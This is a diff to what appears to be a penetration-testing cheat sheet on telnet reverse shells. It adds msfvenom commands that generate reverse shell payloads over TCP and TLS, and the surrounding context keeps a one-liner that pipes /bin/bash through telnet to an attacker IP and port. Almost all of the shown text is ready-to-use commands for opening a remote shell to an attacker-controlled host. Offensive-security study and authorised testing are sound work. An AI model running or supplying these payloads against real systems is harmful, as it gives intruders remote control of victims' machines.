@@ -28,8 +28,24 @@ $ telnet <attacker_IP> <attacker_PORT_1>  | /bin/bash | telnet <attacker_IP> <at
 
 ## 02 - Generate via `msfvenom`
 
+### 2.1 - TCP Method
+
 ```
-$ msfvenom -p cmd/unix/reverse_ssl_double_telnet handlersslcert=[/path/to/file.pem] sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT>
+$ msfvenom -p cmd/unix/reverse shellpath=/bin/sh [telnetpath=/path/to/telnet] lhost=<IP> lport=<PORT>
+```
+
+### 2.2 - TLS Method
+
+You can include TLS certificate to encrypt communication.
+
+```
+$ msfvenom -p cmd/unix/reverse_ssl_double_telnet shellpath=/bin/sh [telnetpath=/path/to/telnet] handlersslcert=[/path/to/file.pem] sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT>
+```
+
+Generate a reverse shell telnet via bash prompt.
+
+```
+$ msfvenom -p cmd/unix/reverse_bash_telnet_ssl handlersslcert=[/path/to/file.pem] sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT>
 ```
 
 ---
